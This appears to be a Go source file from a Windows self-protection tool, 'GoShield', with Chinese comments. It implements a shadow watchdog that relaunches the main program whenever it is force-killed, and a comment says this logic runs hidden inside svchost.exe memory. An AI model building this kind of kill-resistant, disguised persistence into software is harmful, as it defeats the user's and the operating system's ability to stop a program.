// 文件路径: internal/protect/watchdog.go
package protect

import (
	"fmt"
	"os"
	"os/exec"
	"strconv"
	"syscall"
	"unsafe"
)

var (
	kernel32Wdg                = syscall.NewLazyDLL("kernel32.dll")
	procCreateEventW           = kernel32Wdg.NewProc("CreateEventW")
	procOpenEventW             = kernel32Wdg.NewProc("OpenEventW")
	procSetEvent               = kernel32Wdg.NewProc("SetEvent")
	procWaitForMultipleObjects = kernel32Wdg.NewProc("WaitForMultipleObjects")
	procOpenProcessWdg         = kernel32Wdg.NewProc("OpenProcess")
)

const (
	EVENT_MODIFY_STATE       = 0x0002
	SYNCHRONIZE              = 0x00100000
	DETACHED_PROCESS         = 0x00000008
	CREATE_NEW_PROCESS_GROUP = 0x00000200
)

var normalExitEvent syscall.Handle

// SetupMainWatchdog 主进程初始化安全退出事件
func SetupMainWatchdog() {
	myPID := os.Getpid()
	eventName := fmt.Sprintf("GoShield_Exit_%d", myPID)
	evPtr, _ := syscall.UTF16PtrFromString(eventName)
	hEvent, _, _ := procCreateEventW.Call(0, 1, 0, uintptr(unsafe.Pointer(evPtr)))
	normalExitEvent = syscall.Handle(hEvent)
}

// RunShadowMode 影子进程的核心监控逻辑（该函数将在 svchost.exe 内存中运行！）
func RunShadowMode() {
	shadowPIDStr := os.Getenv("GOSHIELD_SHADOW_PID")
	originalExe := os.Getenv("GOSHIELD_ORIGINAL_EXE")

	mainPID, _ := strconv.Atoi(shadowPIDStr)

	// 1. 获取主进程句柄
	mainHandle, _, _ := procOpenProcessWdg.Call(uintptr(SYNCHRONIZE), 0, uintptr(mainPID))
	if mainHandle == 0 {
		restartMainAndExit(originalExe)
	}

	// 2. 获取主进程的安全退出事件句柄
	eventName := fmt.Sprintf("GoShield_Exit_%d", mainPID)
	evPtr, _ := syscall.UTF16PtrFromString(eventName)
	hEvent, _, _ := procOpenEventW.Call(uintptr(SYNCHRONIZE|EVENT_MODIFY_STATE), 0, uintptr(unsafe.Pointer(evPtr)))
	if hEvent == 0 {
		restartMainAndExit(originalExe)
	}

	handles := []syscall.Handle{syscall.Handle(mainHandle), syscall.Handle(hEvent)}

	// 3. 监听主进程生死 (0 触发代表主进程非正常死亡，1 触发代表主进程正常安全退出)
	ret, _, _ := procWaitForMultipleObjects.Call(
		2,
		uintptr(unsafe.Pointer(&handles[0])),
		0,
		0xFFFFFFFF,
	)

	if ret == 0 {
		// 主进程被 Win11 强杀，立刻拉起原始主程序
		restartMainAndExit(originalExe)
	} else {
		// 收到安全退出信号，影子进程安息
		os.Exit(0)
	}
}

// restartMainAndExit 影子拉起主进程并退出自己
func restartMainAndExit(originalExe string) {
	cmd := exec.Command(originalExe)

	// 清洗环境变量，防止污染新复活的主程序，让它以为自己是正常启动的
	var newEnv []string
	for _, env := range os.Environ() {
		if len(env) > 20 && env[:20] == "GOSHIELD_SHADOW_PID=" { continue }
		if len(env) > 22 && env[:22] == "GOSHIELD_ORIGINAL_EXE=" { continue }
		newEnv = append(newEnv, env)
	}
	cmd.Env = newEnv

	cmd.SysProcAttr = &syscall.SysProcAttr{
		CreationFlags: DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP,
	}
	_ = cmd.Start()
	os.Exit(0)
}

// NotifyNormalExit 通知影子进程解除警报
func NotifyNormalExit() {
	if normalExitEvent != 0 {
		procSetEvent.Call(uintptr(normalExitEvent))
	}
}
